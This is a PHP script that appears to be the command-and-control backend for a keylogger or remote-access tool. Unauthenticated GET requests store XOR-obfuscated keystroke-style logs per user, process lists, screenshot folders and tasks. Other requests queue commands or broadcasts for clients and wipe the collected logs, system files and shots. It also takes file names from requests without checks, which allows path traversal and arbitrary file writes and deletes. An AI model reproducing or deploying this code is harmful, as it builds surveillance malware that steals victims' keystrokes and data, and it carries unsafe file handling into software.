
<?    
        
     $option = $_GET['op'];
     $fname = $_GET['fn'];
     $strstr = $_GET['str'];
     $theuser = $_GET['user'];
     $x1 = $_GET['x1'];
     $x2 = $_GET['x2'];
     $x3 = $_GET['x3'];
     $x4 = $_GET['x4'];
     
     
//     echo $filelocation;


/*
function deletefile($ourFileName)
{
$newfile = fopen($ourFileName,"w+");
$add = "NONE";
fputs($newfile, $add, strlen($add));
fclose($newfile);
}
  */
  
function deletefile($ourFileName)
{
unlink($ourFileName);
}
  
  
  
function searchdir ( $path , $maxdepth = -1 , $mode = "FULL" , $d = 0 )
{
   $tempath = "fffFf";
   $newfile = fopen("logslist.txt", "a+");
   if ( substr ( $path , strlen ( $path ) - 1 ) != '/' ) { $path .= '/' ; }     
   $dirlist = array () ;
   if ( $mode != "FILES" ) { $dirlist[] = $path ; }
   if ( $handle = opendir ( $path ) )
   {         
       while ( false !== ( $file = readdir ( $handle ) ) )
       {    
           if ( $file != '.' && $file != '..' )
           {        
   
     
               if ($temppath != $path) {$temppath = $path; $add = "*|" .$path ."||\r\n";   fputs($newfile, $add, strlen($add)); }
               //echo ($file );
               $test5 = filesize( $path . $file );
               $add = "F|" .$file ."|". $test5 ."|".$path."\r\n";  
               fputs($newfile, $add, strlen($add));
               
              // echo "<br>";
               $file = $path . $file ;
            
               if ( ! is_dir ( $file ) ) { if ( $mode != "DIRS" ) { $dirlist[] = $file ; } }
               elseif ( $d >=0 && ($d < $maxdepth || $maxdepth < 0) )
               {         
                   $result = searchdir ( $file . '/' , $maxdepth , $mode , $d + 1 ) ;
                   
                   $dirlist = array_merge ( $dirlist , $result ) ;
               }
       }
       }
       closedir ( $handle ) ;
   
   }
   if ( $d == 0 ) { natcasesort ( $dirlist ) ; }
       fclose($newfile);
   return ( $dirlist ) ;
   
}




function rm($dir) {
   if(!$dh = @opendir($dir)) return;
   while (($obj = readdir($dh))) {
       if($obj=='.' || $obj=='..') continue;
       if (!@unlink($dir.'/'.$obj)) rm($dir.'/'.$obj);
   }
   @rmdir($dir);
}





  function encrypt($st, $key){
      for ($i = 0; $i < strlen($st); $i++){
            $st[$i] = chr(ord($st[$i]) ^ $key);
      }
      return $st;
}

  
  
     if ($option == "log")
     {
     mkdir("Logs", 0777);
     mkdir("Logs/".$theuser, 0777);
    // echo('hey');
     $filelocation = "Logs/".$theuser."/".$fname;
     $newfile = fopen($filelocation, "a+");
     $add =encrypt($strstr,233);
     $add= str_replace("æ","\r\n",$add) ;
     fputs($newfile, $add, strlen($add));
     fclose($newfile);
     }

     else
     

     if ($option == "fm")
     {
     $filelocation = "system/".$fname;
     echo($filelocation);
     $newfile = fopen($filelocation, "a+");
     $strstr =$_GET['body'];
     $add =encrypt($strstr,233);
     $add= str_replace("æ","\r\n",$add) ;
     fputs($newfile, $add, strlen($add));
     fclose($newfile);
     }
     else
      if ($option == "nm")
     {
    // deletefile("shares.txt");
     $filelocation = "shares.txt";
     $newfile = fopen($filelocation, "w+");
     $add = $_GET['body']. "\r\n";
      fputs($newfile, $add, strlen($add));
     fclose($newfile);
     }
     else
     if ($option == "rp")
     {
     $filelocation = "system/".$fname;
     $newfile = fopen($filelocation, "w");
     $add = $x1;
      fputs($newfile, $add, strlen($add));
     fclose($newfile);
     }
     else
     if ($option == "sr")
     {
     $filelocation = "sresult.txt";
     $newfile = fopen($filelocation, "a+");
     $add = $_GET['body'] ."\r\n";
      fputs($newfile, $add, strlen($add));
     fclose($newfile);
     }
     else
     if ($option == "in")
     {
     $filelocation = "info.txt";
     $newfile = fopen($filelocation, "w+");
     $add = $_GET['body'] ."\r\n";
      fputs($newfile, $add, strlen($add));
     fclose($newfile);
     }  
     
    else
     if ($option == "pr")
     {
     $filelocation = "procs.html";
     $newfile = fopen($filelocation, "a+");
     $strstr= $_GET['body'];     
     $add = encrypt($strstr,233);
      fputs($newfile, $add, strlen($add));
     fclose($newfile);
     } 
     else
     if ($option == "setc")
     {
     $rand = mt_rand();
     mkdir("system");
     $filelocation = "system/".$fname; 
     Deletefile("system/rep_".$fname);  
     Deletefile("system/fm_".$fname);
     Deletefile("system/tsk_".$fname);
     Deletefile("system/rps_".$fname);
     echo($filelocation);
     deletefile($filelocation);
     $newfile = fopen($filelocation, "w+");
     $add = "$rand|$x1|$x2|$x3|$x4|";
     fputs($newfile, $add, strlen($add));
     fclose($newfile);
     }
     else
      if ($option == "getlogs")
     {    
     $filelocation = "logslist.txt"; 
     Deletefile($filelocation); 
     $ali = searchdir("Logs",-1,"FILES",$d);

     }
     else
     if ($option == "clearlogs")
     {
     echo "hi";
     rm("Logs");

     }
     
     else
     if ($option == "whosonline")
     {
     deletefile("IPs.txt");
     $rand = mt_rand();

     $filelocation = "broadcast.txt"; 
     
     deletefile($filelocation);
     $newfile = fopen($filelocation, "w+");
     $add = "$rand|yalla|";
     fputs($newfile, $add, strlen($add));
     fclose($newfile);

     }
     
     else
      if ($option == "clearsystem")
     {
       rm("system");
     }
     
       else
      if ($option == "clearshots")
     {
       rm("Shots");
     }
     
       else
      if ($option == "clearlogs")
     {
       rm("Logs");
     }
     
       else
      if ($option == "clearall")
     {
       rm("system");
       rm("Logs");
       rm("Shots");
     }
     

     
     
     
       
     
 
?>

